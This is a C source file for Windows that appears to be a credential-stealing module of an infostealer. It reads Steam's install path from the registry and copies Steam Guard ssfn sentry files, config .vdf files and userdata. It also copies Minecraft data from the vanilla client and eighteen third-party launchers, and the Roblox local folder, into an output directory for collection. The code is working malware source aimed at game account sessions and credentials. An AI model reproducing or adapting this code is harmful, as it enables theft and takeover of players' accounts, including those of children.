#include "gaming.h"
#include "config.h"
#include "file_utils.h"
#include <windows.h>

#ifdef ENABLE_GAMING_STEAM
#include <string.h>
#include <stdio.h>

/* ── Helpers ──────────────────────────────────────────────────── */

static int ensure_dir(const char *path) {
    if (dir_exists(path)) return 0;
    CreateDirectoryA(path, NULL);
    return dir_exists(path) ? 0 : -1;
}

/* Recursively copy src_dir contents into dst_dir */
static void copy_dir_recursive(const char *src_dir, const char *dst_dir) {
    WIN32_FIND_DATAA fd;
    char pattern[MAX_PATH];
    char src[MAX_PATH];
    char dst[MAX_PATH];

    snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    ensure_dir(dst_dir);

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
                continue;
            snprintf(src, sizeof(src), "%s\\%s", src_dir, fd.cFileName);
            snprintf(dst, sizeof(dst), "%s\\%s", dst_dir, fd.cFileName);
            copy_dir_recursive(src, dst);
        } else {
            snprintf(src, sizeof(src), "%s\\%s", src_dir, fd.cFileName);
            snprintf(dst, sizeof(dst), "%s\\%s", dst_dir, fd.cFileName);
            CopyFileA(src, dst, FALSE);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

/* ── Steam ────────────────────────────────────────────────────── */

static int read_steam_path_from_registry(char *buf, size_t buflen) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return -1;

    DWORD type = REG_SZ;
    DWORD size = (DWORD)buflen;
    LONG rc = RegQueryValueExA(hKey, "SteamPath", NULL, &type, (LPBYTE)buf, &size);
    RegCloseKey(hKey);

    if (rc != ERROR_SUCCESS || type != REG_SZ) return -1;
    /* Steam stores forward slashes; convert to backslashes */
    for (size_t i = 0; buf[i]; i++) {
        if (buf[i] == '/') buf[i] = '\\';
    }
    return 0;
}

static int collect_ssfn_files(const char *steam_path, const char *output_dir) {
    WIN32_FIND_DATAA fd;
    char pattern[MAX_PATH];
    char src[MAX_PATH];
    char dst[MAX_PATH];

    snprintf(pattern, sizeof(pattern), "%s\\ssfn*", steam_path);
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        snprintf(src, sizeof(src), "%s\\%s", steam_path, fd.cFileName);
        snprintf(dst, sizeof(dst), "%s\\%s", output_dir, fd.cFileName);
        CopyFileA(src, dst, FALSE);
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return 0;
}

static int collect_vdf_files(const char *steam_path, const char *output_dir) {
    WIN32_FIND_DATAA fd;
    char config_dir[MAX_PATH];
    char pattern[MAX_PATH];
    char src[MAX_PATH];
    char dst[MAX_PATH];

    snprintf(config_dir, sizeof(config_dir), "%s\\config", steam_path);
    snprintf(pattern, sizeof(pattern), "%s\\*.vdf", config_dir);
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    char dst_config[MAX_PATH];
    snprintf(dst_config, sizeof(dst_config), "%s\\config", output_dir);
    ensure_dir(dst_config);

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        snprintf(src, sizeof(src), "%s\\%s", config_dir, fd.cFileName);
        snprintf(dst, sizeof(dst), "%s\\%s", dst_config, fd.cFileName);
        CopyFileA(src, dst, FALSE);
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return 0;
}

static int collect_userdata_dirs(const char *steam_path, const char *output_dir) {
    WIN32_FIND_DATAA fd;
    char userdata_src[MAX_PATH];
    char userdata_dst[MAX_PATH];
    char pattern[MAX_PATH];
    char src[MAX_PATH];
    char dst[MAX_PATH];

    snprintf(userdata_src, sizeof(userdata_src), "%s\\userdata", steam_path);
    if (!dir_exists(userdata_src)) return 0;

    snprintf(userdata_dst, sizeof(userdata_dst), "%s\\userdata", output_dir);
    ensure_dir(userdata_dst);

    snprintf(pattern, sizeof(pattern), "%s\\*", userdata_src);
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        snprintf(src, sizeof(src), "%s\\%s", userdata_src, fd.cFileName);
        snprintf(dst, sizeof(dst), "%s\\%s", userdata_dst, fd.cFileName);
        copy_dir_recursive(src, dst);
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return 0;
}

int gaming_collect_steam(const char *output_dir) {
    char steam_path[MAX_PATH] = {0};
    char dst_steam[MAX_PATH];

    /* Try registry first */
    if (read_steam_path_from_registry(steam_path, sizeof(steam_path)) != 0) {
        /* Fallback */
        const char *fallback = "C:\\Program Files (x86)\\Steam";
        if (!dir_exists(fallback)) return 0;
        strncpy(steam_path, fallback, sizeof(steam_path) - 1);
    }

    snprintf(dst_steam, sizeof(dst_steam), "%s\\steam", output_dir);
    ensure_dir(dst_steam);

    collect_ssfn_files(steam_path, dst_steam);
    collect_vdf_files(steam_path, dst_steam);
    collect_userdata_dirs(steam_path, dst_steam);

    return 0;
}

/* ── Minecraft ────────────────────────────────────────────────── */

/* Launcher subdirectory definitions */
static const struct {
    const char *name;
    const char *subdir;
    const char *relative;
} mc_launchers[] = {
    { "TLauncher",        ".tlauncher",        "minecraft" },
    { "Lunar Client",     ".lunarclient",      "offline" },
    { "Feather",          ".feather",           "minecraft" },
    { "Badlion",          ".badlion",           "minecraft" },
    { "PolyMC",           "PolyMC",             "minecraft" },
    { "Prism",            "PrismLauncher",      "minecraft" },
    { "MultiMC",          "MultiMC",            "minecraft" },
    { "ATLauncher",       "ATLauncher",         "minecraft" },
    { "GDLauncher",       "GDLauncher",         "minecraft" },
    { "HMCL",             "HMCL",               ".minecraft" },
    { "SKlauncher",       "SKlauncher",         "minecraft" },
    { "Technic",          "technic",            "minecraft" },
    { "Crystal",          "crystal-launcher",   "minecraft" },
    { "Salwyrr",          "SalwyrrLauncher",    "minecraft" },
    { "Pojav",            "PojavLauncher",      "minecraft" },
    { "CKPack",           "ckpack",             "minecraft" },
    { "Novoline",         "novoline",           "versions" },
    { "MagicLauncher",    "MagicLauncher",      "minecraft" },
};
#define MC_LAUNCHER_COUNT (sizeof(mc_launchers) / sizeof(mc_launchers[0]))

int gaming_collect_minecraft(const char *output_dir) {
    char appdata[MAX_PATH];
    DWORD len = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
    if (len == 0 || len >= sizeof(appdata)) return -1;

    char dst_mc[MAX_PATH];
    snprintf(dst_mc, sizeof(dst_mc), "%s\\minecraft", output_dir);
    ensure_dir(dst_mc);

    /* Vanilla .minecraft */
    char vanilla[MAX_PATH];
    snprintf(vanilla, sizeof(vanilla), "%s\\.minecraft", appdata);
    if (dir_exists(vanilla)) {
        copy_dir_recursive(vanilla, dst_mc);
    }

    /* Launcher profiles from vanilla */
    char profiles_src[MAX_PATH];
    snprintf(profiles_src, sizeof(profiles_src), "%s\\.minecraft\\launcher_profiles.json", appdata);
    if (file_exists(profiles_src)) {
        char profiles_dst[MAX_PATH];
        snprintf(profiles_dst, sizeof(profiles_dst), "%s\\launcher_profiles.json", dst_mc);
        CopyFileA(profiles_src, profiles_dst, FALSE);
    }

    /* Third-party launchers */
    for (size_t i = 0; i < MC_LAUNCHER_COUNT; i++) {
        char launcher_path[MAX_PATH];
        snprintf(launcher_path, sizeof(launcher_path), "%s\\%s\\%s",
                 appdata, mc_launchers[i].subdir, mc_launchers[i].relative);
        if (!dir_exists(launcher_path)) continue;

        char dst_launcher[MAX_PATH];
        snprintf(dst_launcher, sizeof(dst_launcher), "%s\\%s", dst_mc, mc_launchers[i].name);
        copy_dir_recursive(launcher_path, dst_launcher);
    }

    return 0;
}

/* ── Roblox ───────────────────────────────────────────────────── */

int gaming_collect_roblox(const char *output_dir) {
    char localappdata[MAX_PATH];
    DWORD len = GetEnvironmentVariableA("LOCALAPPDATA", localappdata, sizeof(localappdata));
    if (len == 0 || len >= sizeof(localappdata)) return -1;

    char roblox_src[MAX_PATH];
    snprintf(roblox_src, sizeof(roblox_src), "%s\\Roblox", localappdata);
    if (!dir_exists(roblox_src)) return 0;

    char dst_roblox[MAX_PATH];
    snprintf(dst_roblox, sizeof(dst_roblox), "%s\\roblox", output_dir);
    copy_dir_recursive(roblox_src, dst_roblox);

    return 0;
}

/* ── All ──────────────────────────────────────────────────────── */

int gaming_collect_all(const char *output_dir) {
    ensure_dir(output_dir);
    gaming_collect_steam(output_dir);
    gaming_collect_minecraft(output_dir);
    gaming_collect_roblox(output_dir);
    return 0;
}

#endif /* ENABLE_GAMING_STEAM */
